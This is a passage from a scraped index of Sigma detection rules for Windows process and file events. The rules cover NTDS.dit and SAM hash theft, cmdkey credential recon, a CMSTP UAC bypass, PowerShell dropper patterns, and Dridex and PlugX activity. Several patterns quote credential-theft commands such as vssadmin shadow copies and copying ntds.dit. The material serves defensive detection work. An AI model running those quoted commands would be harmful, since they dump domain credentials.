https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/ tags: - attack.credential_access - attack.t1003 logsource: category: process_creation product: windows detection: selection: CommandLine: - vssadmin.exe Delete Shadows - \u0026#39;vssadmin create shadow /for=C:\u0026#39; - copy \\\\?\\GLOBALROOT\\Device\\\\*\\windows\\ntds\\ntds.dit - copy \\\\?\\GLOBALROOT\\Device\\\\*\\config\\SAM - \u0026#39;vssadmin delete shadows /for=C:\u0026#39; - \u0026#39;reg SAVE HKLM\\SYSTEM \u0026#39; - esentutl.exe /y /vss *\\ntds.dit* - esentutl.exe /y /vss *\\SAM - esentutl.exe /y /vss *\\SYSTEM condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Administrative activity level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/deprecated/win_susp_vssadmin_ntds_activity.yml/","tags":["attack.credential_access","attack.t1003"],"title":"Activity Related to NTDS.dit Domain Hash Retrieval"},{"categories":null,"contents":"Detects usage of cmdkey to look for cached credentials\nKnown false-positives Legitimate administrative tasks References https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation https://technet.microsoft.com/en-us/library/cc754243(v=ws.11).aspx Raw rule (edit) title: Cmdkey Cached Credentials Recon id: 07f8bdc2-c9b3-472a-9817-5a670b872f53 status: experimental description: Detects usage of cmdkey to look for cached credentials references: - https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation - https://technet.microsoft.com/en-us/library/cc754243(v=ws.11).aspx author: jmallette date: 2019/01/16 modified: 2021/07/07 tags: - attack.credential_access - attack.t1003.005 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\cmdkey.exe\u0026#39; CommandLine|contains: \u0026#39; /list\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine - User falsepositives: - Legitimate administrative tasks level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_cmdkey_recon.yml/","tags":["attack.credential_access","attack.t1003.005"],"title":"Cmdkey Cached Credentials Recon"},{"categories":null,"contents":"Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects (e.g. UACMe ID of 41, 43, 58 or 65)\nKnown false-positives Legitimate CMSTP use (unlikely in modern enterprise environments) References https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/ https://twitter.com/hFireF0X/status/897640081053364225 https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf https://github.com/hfiref0x/UACME Raw rule (edit) title: CMSTP UAC Bypass via COM Object Access id: 4b60e6f2-bf39-47b4-b4ea-398e33cfe253 status: stable description: Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects (e.g. UACMe ID of 41, 43, 58 or 65) tags: - attack.execution - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 - attack.t1218.003 - attack.g0069 - car.2019-04-001 author: Nik Seetharaman, Christian Burkard modified: 2019/07/31 date: 2021/08/31 references: - https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/ - https://twitter.com/hFireF0X/status/897640081053364225 - https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf - https://github.com/hfiref0x/UACME logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\DllHost.exe\u0026#39; IntegrityLevel: - \u0026#39;High\u0026#39; - \u0026#39;System\u0026#39; ParentCommandLine|contains: - \u0026#39; /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\u0026#39; - \u0026#39; /Processid:{3E000D72-A845-4CD9-BD83-80C07C3B881F}\u0026#39; - \u0026#39; /Processid:{BD54C901-076B-434E-B6C7-17C531F4AB41}\u0026#39; - \u0026#39; /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}\u0026#39; - \u0026#39; /Processid:{E9495B87-D950-4AB5-87A5-FF6D70BF3E90}\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine - Hashes falsepositives: - Legitimate CMSTP use (unlikely in modern enterprise environments) level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_cmstp_com_object_access.yml/","tags":["attack.execution","attack.defense_evasion","attack.privilege_escalation","attack.t1548.002","attack.t1218.003","attack.g0069","car.2019-04-001"],"title":"CMSTP UAC Bypass via COM Object Access"},{"categories":null,"contents":"Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs \u0026gt; powershell)\nKnown false-positives High References https://www.hybrid-analysis.com/sample/3a1f01206684410dbe8f1900bbeaaa543adfcd07368ba646b499fa5274b9edf6?environmentId=100 https://www.hybrid-analysis.com/sample/f16c729aad5c74f19784a24257236a8bbe27f7cdc4a89806031ec7f1bebbd475?environmentId=100 Raw rule (edit) title: Command Line Execution with Suspicious URL and AppData Strings id: 1ac8666b-046f-4201-8aba-1951aaec03a3 status: test description: Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs \u0026gt; powershell) author: Florian Roth, Jonhnathan Ribeiro, oscd.community references: - https://www.hybrid-analysis.com/sample/3a1f01206684410dbe8f1900bbeaaa543adfcd07368ba646b499fa5274b9edf6?environmentId=100 - https://www.hybrid-analysis.com/sample/f16c729aad5c74f19784a24257236a8bbe27f7cdc4a89806031ec7f1bebbd475?environmentId=100 date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\cmd.exe\u0026#39; CommandLine|contains|all: - \u0026#39;http\u0026#39; # captures both http and https - \u0026#39;://\u0026#39; - \u0026#39;%AppData%\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - High level: medium tags: - attack.execution - attack.t1059.003 - attack.t1059.001 - attack.command_and_control - attack.t1105 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_cmd_http_appdata.yml/","tags":["attack.execution","attack.t1059.003","attack.t1059.001","attack.command_and_control","attack.t1105"],"title":"Command Line Execution with Suspicious URL and AppData Strings"},{"categories":null,"contents":"Detects PowerShell Strings applied to rundll as seen in PowerShdll.dll\nKnown false-positives Unknown References https://github.com/p3nt4/PowerShdll/blob/master/README.md Raw rule (edit) title: Detection of PowerShell Execution via DLL id: 6812a10b-60ea-420c-832f-dfcc33b646ba status: test description: Detects PowerShell Strings applied to rundll as seen in PowerShdll.dll author: Markus Neis references: - https://github.com/p3nt4/PowerShdll/blob/master/README.md date: 2018/08/25 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: - \u0026#39;\\rundll32.exe\u0026#39; selection2: Description|contains: - \u0026#39;Windows-Hostprozess (Rundll32)\u0026#39; selection3: CommandLine|contains: - \u0026#39;Default.GetString\u0026#39; - \u0026#39;FromBase64String\u0026#39; condition: (selection1 or selection2) and selection3 falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1218.011 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_dll_execution.yml/","tags":["attack.defense_evasion","attack.t1218.011"],"title":"Detection of PowerShell Execution via DLL"},{"categories":null,"contents":"Detects typical Dridex process patterns\nKnown false-positives Unlikely References https://app.any.run/tasks/993daa5e-112a-4ff6-8b5a-edbcec7c7ba3 Raw rule (edit) title: Dridex Process Pattern id: e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e status: test description: Detects typical Dridex process patterns author: Florian Roth, oscd.community references: - https://app.any.run/tasks/993daa5e-112a-4ff6-8b5a-edbcec7c7ba3 date: 2019/01/10 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: \u0026#39;\\svchost.exe\u0026#39; CommandLine|contains|all: - \u0026#39;C:\\Users\\\u0026#39; - \u0026#39;\\Desktop\\\u0026#39; selection2: ParentImage|endswith: \u0026#39;\\svchost.exe\u0026#39; selection3: Image|endswith: \u0026#39;\\whoami.exe\u0026#39; CommandLine|contains: \u0026#39;all\u0026#39; selection4: Image|endswith: - \u0026#39;\\net.exe\u0026#39; - \u0026#39;\\net1.exe\u0026#39; CommandLine|contains: \u0026#39;view\u0026#39; condition: selection1 or selection2 and (selection3 or selection4) falsepositives: - Unlikely level: critical tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 - attack.discovery - attack.t1135 - attack.t1033 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_malware_dridex.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1055","attack.discovery","attack.t1135","attack.t1033"],"title":"Dridex Process Pattern"},{"categories":null,"contents":"Detects exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other sub processes like mshta.exe\nKnown false-positives unknown References https://www.hybrid-analysis.com/sample/2a4ae284c76f868fc51d3bb65da8caa6efacb707f265b25c30f34250b76b7507?environmentId=100 https://www.google.com/url?hl=en\u0026amp;q=https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about\u0026amp;source=gmail\u0026amp;ust=1511481120837000\u0026amp;usg=AFQjCNGdL7gVwLXaNSl2Td8ylDYbSJFmPw Raw rule (edit) title: Droppers Exploiting CVE-2017-11882 id: 678eb5f4-8597-4be6-8be7-905e4234b53a status: test description: Detects exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other sub processes like mshta.exe author: Florian Roth references: - https://www.hybrid-analysis.com/sample/2a4ae284c76f868fc51d3bb65da8caa6efacb707f265b25c30f34250b76b7507?environmentId=100 - https://www.google.com/url?hl=en\u0026amp;q=https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about\u0026amp;source=gmail\u0026amp;ust=1511481120837000\u0026amp;usg=AFQjCNGdL7gVwLXaNSl2Td8ylDYbSJFmPw date: 2017/11/23 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\EQNEDT32.EXE\u0026#39; condition: selection fields: - CommandLine falsepositives: - unknown level: critical tags: - attack.execution - attack.t1203 - attack.t1204.002 - attack.initial_access - attack.t1566.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_exploit_cve_2017_11882.yml/","tags":["attack.execution","attack.t1203","attack.t1204.002","attack.initial_access","attack.t1566.001"],"title":"Droppers Exploiting CVE-2017-11882"},{"categories":null,"contents":"Detects the execution of an executable that is typically used by PlugX for DLL side loading started from an uncommon location\nKnown false-positives Unknown References http://www.hexacorn.com/blog/2016/03/10/beyond-good-ol-run-key-part-36/ https://countuponsecurity.com/2017/06/07/threat-hunting-in-the-enterprise-with-appcompatprocessor/ Raw rule (edit) title: Executable Used by PlugX in Uncommon Location id: aeab5ec5-be14-471a-80e8-e344418305c2 status: test description: Detects the execution of an executable that is typically used by PlugX for DLL side loading started from an uncommon location author: Florian Roth references: - http://www.hexacorn.com/blog/2016/03/10/beyond-good-ol-run-key-part-36/ - https://countuponsecurity.com/2017/06/07/threat-hunting-in-the-enterprise-with-appcompatprocessor/ date: 2017/06/12 modified: 2022/01/28 logsource: category: process_creation product: windows detection: selection_cammute: Image|endswith: \u0026#39;\\CamMute.exe\u0026#39; filter_cammute: Image|contains: - \u0026#39;\\Lenovo\\Communication Utility\\\u0026#39; - \u0026#39;\\Lenovo\\Communications Utility\\\u0026#39; selection_chrome_frame: Image|endswith: \u0026#39;\\chrome_frame_helper.exe\u0026#39; filter_chrome_frame: Image|contains: \u0026#39;\\Google\\Chrome\\application\\\u0026#39; selection_devemu: Image|endswith: \u0026#39;\\dvcemumanager.exe\u0026#39; filter_devemu: Image|contains: \u0026#39;\\Microsoft Device Emulator\\\u0026#39; selection_gadget: Image|endswith: \u0026#39;\\Gadget.exe\u0026#39; filter_gadget: Image|contains: \u0026#39;\\Windows Media Player\\\u0026#39; selection_hcc: Image|endswith: \u0026#39;\\hcc.exe\u0026#39; filter_hcc: Image|contains: \u0026#39;\\HTML Help Workshop\\\u0026#39; selection_hkcmd: Image|endswith: \u0026#39;\\hkcmd.exe\u0026#39; filter_hkcmd: Image|contains: - \u0026#39;\\System32\\\u0026#39; - \u0026#39;\\SysNative\\\u0026#39; - \u0026#39;\\SysWow64\\\u0026#39; selection_mc: Image|endswith: \u0026#39;\\Mc.exe\u0026#39; filter_mc: Image|contains: - \u0026#39;\\Microsoft Visual Studio\u0026#39; - \u0026#39;\\Microsoft SDK\u0026#39; - \u0026#39;\\Windows Kit\u0026#39; selection_msmpeng: Image|endswith: \u0026#39;\\MsMpEng.exe\u0026#39; filter_msmpeng: Image|contains: - \u0026#39;\\Microsoft Security Client\\\u0026#39; - \u0026#39;\\Windows Defender\\\u0026#39; - \u0026#39;\\AntiMalware\\\u0026#39; selection_msseces: Image|endswith: \u0026#39;\\msseces.exe\u0026#39; filter_msseces: Image|contains: - \u0026#39;\\Microsoft Security Center\\\u0026#39; - \u0026#39;\\Microsoft Security Client\\\u0026#39; - \u0026#39;\\Microsoft Security Essentials\\\u0026#39; selection_oinfo: Image|endswith: \u0026#39;\\OInfoP11.exe\u0026#39; filter_oinfo: Image|contains: \u0026#39;\\Common Files\\Microsoft Shared\\\u0026#39; selection_oleview: Image|endswith: \u0026#39;\\OleView.exe\u0026#39; filter_oleview: Image|contains: - \u0026#39;\\Microsoft Visual Studio\u0026#39; - \u0026#39;\\Microsoft SDK\u0026#39; - \u0026#39;\\Windows Kit\u0026#39; - \u0026#39;\\Windows Resource Kit\\\u0026#39; selection_rc: Image|endswith: \u0026#39;\\rc.exe\u0026#39; filter_rc: Image|contains: - \u0026#39;\\Microsoft Visual Studio\u0026#39; - \u0026#39;\\Microsoft SDK\u0026#39; - \u0026#39;\\Windows Kit\u0026#39; - \u0026#39;\\Windows Resource Kit\\\u0026#39; - \u0026#39;\\Microsoft.NET\\\u0026#39; condition: ( selection_cammute and not filter_cammute ) or ( selection_chrome_frame and not filter_chrome_frame ) or ( selection_devemu and not filter_devemu ) or ( selection_gadget and not filter_gadget ) or ( selection_hcc and not filter_hcc ) or ( selection_hkcmd and not filter_hkcmd ) or ( selection_mc and not filter_mc ) or ( selection_msmpeng and not filter_msmpeng ) or ( selection_msseces and not filter_msseces ) or ( selection_oinfo and not filter_oinfo ) or ( selection_oleview and not filter_oleview ) or ( selection_rc and not filter_rc ) fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.s0013 - attack.defense_evasion - attack.t1574.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_plugx_susp_exe_locations.yml/","tags":["attack.s0013","attack.defense_evasion","attack.t1574.002"],"title":"Executable Used by PlugX in Uncommon Location"},{"categories":null,"contents":"Detects a suspicious program execution in a web service root folder (filter out false positives)\nKnown false-positives Various applications Tools that include ping or nslookup command invocations Raw rule (edit) title: Execution in Webserver Root Folder id: 35efb964-e6a5-47ad-bbcd-19661854018d status: test description: Detects a suspicious program execution in a web service root folder (filter out false positives) author: Florian Roth date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|contains: - \u0026#39;\\wwwroot\\\u0026#39; - \u0026#39;\\wmpub\\\u0026#39; - \u0026#39;\\htdocs\\\u0026#39; filter: Image|contains: - \u0026#39;bin\\\u0026#39; - \u0026#39;\\Tools\\\u0026#39; - \u0026#39;\\SMSComponent\\\u0026#39; ParentImage|endswith: - \u0026#39;\\services.exe\u0026#39; condition: selection and not filter fields: - CommandLine - ParentCommandLine falsepositives: - Various applications - Tools that include ping or nslookup command invocations level: medium tags: - attack.persistence - attack.t1505.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_execution_path_webserver.yml/","tags":["attack.persistence","attack.t1505.003"],"title":"Execution in Webserver Root Folder"},{"categories":null,"contents":"Detects Winword starting uncommon sub process FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262\nKnown false-positives Several false positives identified, check for suspicious file names or locations (e.g. Temp folders) References https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html Raw rule (edit) title: Exploit for CVE-2017-0261 id: 864403a1-36c9-40a2-a982-4c9a45f7d833 status: test description: Detects Winword starting uncommon sub process FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262 author: Florian Roth references: - https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html date: 2018/02/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\WINWORD.EXE\u0026#39; Image|contains: \u0026#39;\\FLTLDR.exe\u0026#39; condition: selection falsepositives: - Several false positives identified, check for suspicious file names or locations (e.g. Temp folders) level: medium tags: - attack.execution - attack.t1203 - attack.t1204.002 - attack.initial_access - attack.t1566.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_exploit_cve_2017_0261.yml/","tags":["attack.execution","attack.t1203","attack.t1204.002","attack.initial_access","attack.t1566.001"],"title":"Exploit for CVE-2017-0261"},{"categories":null,"contents":"Detects the creation of an executable with a system process name in a suspicious folder\nKnown false-positives System processes copied outside the default folder Raw rule (edit) title: File Created with System Process Name id: d5866ddf-ce8f-4aea-b28e-d96485a20d3d status: test description: Detects the creation of an executable with a system process name in a suspicious folder author: Sander Wiebing, Tim Shelton date: 2020/05/26 modified: 2022/02/22 tags: - attack.defense_evasion - attack.t1036.005 logsource: category: file_event product: windows detection: selection: TargetFilename|endswith: - \u0026#39;\\svchost.exe\u0026#39; - \u0026#39;\\rundll32.exe\u0026#39; - \u0026#39;\\services.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\regsvr32.exe\u0026#39; - \u0026#39;\\spoolsv.exe\u0026#39; - \u0026#39;\\lsass.exe\u0026#39; - \u0026#39;\\smss.exe\u0026#39; - \u0026#39;\\csrss.exe\u0026#39; - \u0026#39;\\conhost.exe\u0026#39; - \u0026#39;\\wininit.exe\u0026#39; - \u0026#39;\\lsm.exe\u0026#39; - \u0026#39;\\winlogon.exe\u0026#39; - \u0026#39;\\explorer.exe\u0026#39; - \u0026#39;\\taskhost.exe\u0026#39; - \u0026#39;\\Taskmgr.exe\u0026#39; - \u0026#39;\\taskmgr.exe\u0026#39; - \u0026#39;\\sihost.exe\u0026#39; - \u0026#39;\\RuntimeBroker.exe\u0026#39; - \u0026#39;\\runtimebroker.exe\u0026#39; - \u0026#39;\\smartscreen.exe\u0026#39; - \u0026#39;\\dllhost.exe\u0026#39; - \u0026#39;\\audiodg.exe\u0026#39; - \u0026#39;\\wlanext.exe\u0026#39; filter1: TargetFilename|startswith: - \u0026#39;C:\\Windows\\System32\\\u0026#39; - \u0026#39;C:\\Windows\\system32\\\u0026#39; - \u0026#39;C:\\Windows\\SysWow64\\\u0026#39; - \u0026#39;C:\\Windows\\SysWOW64\\\u0026#39; - \u0026#39;C:\\Windows\\winsxs\\\u0026#39; - \u0026#39;C:\\Windows\\WinSxS\\\u0026#39; - \u0026#39;\\SystemRoot\\System32\\\u0026#39; Image|endswith: - \u0026#39;\\Windows\\System32\\dism.exe\u0026#39; - \u0026#39;\\TiWorker.exe\u0026#39; filter2: TargetFilename|startswith: \u0026#39;C:\\$WINDOWS.~BT\\\u0026#39; Image: \u0026#39;C:\\$WINDOWS.~BT\\Sources\\SetupHost.exe\u0026#39; filter3: TargetFilename|endswith: \u0026#39;\\RuntimeBroker.exe\u0026#39; Image: \u0026#39;C:\\Windows\\system32\\wbengine.exe\u0026#39; condition: selection and not 1 of filter* fields: - Image falsepositives: - System processes copied outside the default folder level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_creation_system_file.yml/","tags":["attack.defense_evasion","attack.t1036.005"],"title":"File Created with System Process Name"},{"categories":null,"contents":"Detects usage of attrib.exe to hide files from users.\nKnown false-positives igfxCUIService.exe hiding *.cui files via .bat script (attrib.exe a child of cmd.exe and igfxCUIService.exe is the parent of the cmd.exe) msiexec.exe hiding desktop.ini Raw rule (edit) title: Hiding Files with Attrib.exe id: 4281cb20-2994-4580-aa63-c8b86d019934 status: test description: Detects usage of attrib.exe to hide files from users. author: Sami Ruohonen date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\attrib.exe\u0026#39; CommandLine|contains: \u0026#39; +h \u0026#39; ini: CommandLine|contains: \u0026#39;\\desktop.ini \u0026#39; intel: ParentImage|endswith: \u0026#39;\\cmd.exe\u0026#39; CommandLine: +R +H +S +A \\\\*.cui ParentCommandLine: C:\\WINDOWS\\system32\\\\*.bat condition: selection and not (ini or intel) fields: - CommandLine - ParentCommandLine - User falsepositives: - igfxCUIService.exe hiding *.cui files via .bat script (attrib.exe a child of cmd.exe and igfxCUIService.exe is the parent of the cmd.exe) - msiexec.exe hiding desktop.ini level: low tags: - attack.defense_evasion - attack.t1564.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_attrib_hiding_files.yml/","tags":["attack.defense_evasion","attack.t1564.001"],"title":"Hiding Files with Attrib.exe"},{"categories":null,"contents":"Detects suspicious IIS native-code module installations via command line\nKnown false-positives Unknown as it may vary from organisation to arganisation how admins use to install IIS modules References https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/ Raw rule (edit) title: IIS Native-Code Module Command Line Installation id: 9465ddf4-f9e4-4ebd-8d98-702df3a93239 status: test description: Detects suspicious IIS native-code module installations via command line author: Florian Roth references: - https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/ date: 2012/12/11 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\appcmd.exe\u0026#39; CommandLine|contains|all: - \u0026#39;install\u0026#39; - \u0026#39;module\u0026#39; - \u0026#39;/name:\u0026#39; condition: selection falsepositives: - Unknown as it may vary from organisation to arganisation how admins use to install IIS modules level: medium tags: - attack.persistence - attack.t1505.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_iss_module_install.yml/","tags":["attack.persistence","attack.t1505.003"],"title":"IIS Native-Code Module Command Line Installation"},{"categories":null,"contents":"Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)\nKnown false-positives NTDS maintenance References https://jpcertcc.github.io/ToolAnalysisResultSheet/details/ntdsutil.htm Raw rule (edit) title: Invocation of Active Directory Diagnostic Tool (ntdsutil.exe) id: 2afafd61-6aae-4df4-baed-139fa1f4c345 status: test description: Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT) author: Thomas Patzke references: - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/ntdsutil.htm date: 2019/01/16 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\ntdsutil.exe\u0026#39; condition: selection falsepositives: - NTDS maintenance level: medium tags: - attack.credential_access - attack.t1003.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_ntdsutil.yml/","tags":["attack.credential_access","attack.t1003.003"],"title":"Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)"},{"categories":null,"contents":"Detects base64 encoded strings used in hidden malicious PowerShell command lines\nKnown false-positives Penetration tests References http://www.leeholmes.com/blog/2017/09/21/searching-for-content-in-base-64-strings/ Raw rule (edit) title: Malicious Base64 Encoded PowerShell Keywords in Command Lines id: f26c6093-6f14-4b12-800f-0fcb46f5ffd0 status: test description: Detects base64 encoded strings used in hidden malicious PowerShell command lines author: John Lambert (rule) references: - http://www.leeholmes.com/blog/2017/09/21/searching-for-content-in-base-64-strings/ date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: encoded: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|contains: \u0026#39; hidden \u0026#39; selection: CommandLine|contains: - \u0026#39;AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA\u0026#39; - \u0026#39;aXRzYWRtaW4gL3RyYW5zZmVy\u0026#39; - \u0026#39;IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA\u0026#39; - \u0026#39;JpdHNhZG1pbiAvdHJhbnNmZX\u0026#39; - \u0026#39;YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg\u0026#39; - \u0026#39;Yml0c2FkbWluIC90cmFuc2Zlc\u0026#39; - \u0026#39;AGMAaAB1AG4AawBfAHMAaQB6AGUA\u0026#39; - \u0026#39;JABjAGgAdQBuAGsAXwBzAGkAegBlA\u0026#39; - \u0026#39;JGNodW5rX3Npem\u0026#39; - \u0026#39;QAYwBoAHUAbgBrAF8AcwBpAHoAZQ\u0026#39; - \u0026#39;RjaHVua19zaXpl\u0026#39; - \u0026#39;Y2h1bmtfc2l6Z\u0026#39; - \u0026#39;AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A\u0026#39; - \u0026#39;kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg\u0026#39; - \u0026#39;lPLkNvbXByZXNzaW9u\u0026#39; - \u0026#39;SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA\u0026#39; - \u0026#39;SU8uQ29tcHJlc3Npb2\u0026#39; - \u0026#39;Ty5Db21wcmVzc2lvb\u0026#39; - \u0026#39;AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ\u0026#39; - \u0026#39;kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA\u0026#39; - \u0026#39;lPLk1lbW9yeVN0cmVhb\u0026#39; - \u0026#39;SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A\u0026#39; - \u0026#39;SU8uTWVtb3J5U3RyZWFt\u0026#39; - \u0026#39;Ty5NZW1vcnlTdHJlYW\u0026#39; - \u0026#39;4ARwBlAHQAQwBoAHUAbgBrA\u0026#39; - \u0026#39;5HZXRDaHVua\u0026#39; - \u0026#39;AEcAZQB0AEMAaAB1AG4Aaw\u0026#39; - \u0026#39;LgBHAGUAdABDAGgAdQBuAGsA\u0026#39; - \u0026#39;LkdldENodW5r\u0026#39; - \u0026#39;R2V0Q2h1bm\u0026#39; - \u0026#39;AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A\u0026#39; - \u0026#39;QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA\u0026#39; - \u0026#39;RIUkVBRF9JTkZPNj\u0026#39; - \u0026#39;SFJFQURfSU5GTzY0\u0026#39; - \u0026#39;VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA\u0026#39; - \u0026#39;VEhSRUFEX0lORk82N\u0026#39; - \u0026#39;AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA\u0026#39; - \u0026#39;cmVhdGVSZW1vdGVUaHJlYW\u0026#39; - \u0026#39;MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA\u0026#39; - \u0026#39;NyZWF0ZVJlbW90ZVRocmVhZ\u0026#39; - \u0026#39;Q3JlYXRlUmVtb3RlVGhyZWFk\u0026#39; - \u0026#39;QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA\u0026#39; - \u0026#39;0AZQBtAG0AbwB2AGUA\u0026#39; - \u0026#39;1lbW1vdm\u0026#39; - \u0026#39;AGUAbQBtAG8AdgBlA\u0026#39; - \u0026#39;bQBlAG0AbQBvAHYAZQ\u0026#39; - \u0026#39;bWVtbW92Z\u0026#39; - \u0026#39;ZW1tb3Zl\u0026#39; condition: encoded and selection falsepositives: - Penetration tests level: high tags: - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_powershell_hidden_b64_cmd.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Malicious Base64 Encoded PowerShell Keywords in Command Lines"},{"categories":null,"contents":"Detects process injection using the signed Windows tool Mavinject32.exe\nKnown false-positives unknown References https://twitter.com/gN3mes1s/status/941315826107510784 https://reaqta.com/2017/12/mavinject-microsoft-injector/ https://twitter.com/Hexacorn/status/776122138063409152 Raw rule (edit) title: MavInject Process Injection id: 17eb8e57-9983-420d-ad8a-2c4976c22eb8 status: test description: Detects process injection using the signed Windows tool Mavinject32.exe author: Florian Roth references: - https://twitter.com/gN3mes1s/status/941315826107510784 - https://reaqta.com/2017/12/mavinject-microsoft-injector/ - https://twitter.com/Hexacorn/status/776122138063409152 date: 2018/12/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: \u0026#39; /INJECTRUNNING \u0026#39; condition: selection falsepositives: - unknown level: critical tags: - attack.t1055.001 - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_mavinject_proc_inj.yml/","tags":["attack.t1055.001","attack.t1218"],"title":"MavInject Process Injection"},{"categories":null,"contents":"Detects a Windows command and scripting interpreter executable started from Microsoft Word, Excel, Powerpoint, Publisher and Visio\nKnown false-positives unknown References https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100 https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html Raw rule (edit) title: Microsoft Office Product Spawning Windows Shell id: 